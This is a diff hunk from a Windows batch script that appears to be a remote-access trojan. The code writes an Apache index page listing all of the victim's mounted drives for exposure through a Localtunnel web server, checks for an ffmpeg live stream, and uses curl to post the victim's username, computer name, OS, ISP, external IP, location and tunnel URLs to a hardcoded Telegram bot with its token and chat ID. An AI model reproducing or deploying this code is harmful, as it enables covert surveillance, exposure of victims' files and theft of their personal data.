@@ -74,7 +74,7 @@ if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Of
 tasklist /fi "imagename eq ffmpeg.exe" | find /i "ffmpeg.exe" > nul
 if not errorlevel 1 (set LS="%WS%!newtemp!") else (set LS="Off")
 
-powershell.exe Remove-Item -Force "C:\index.html"
+powershell.exe Remove-Item -Force "%environment%\apache2\index.html"
 FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (set drive=%%a && echo ^<a href="%WS%disk!drive:~0,-3!"^>%%a^</a^>^<br^> >> "%environment%\apache2\index.html"))
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %LS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
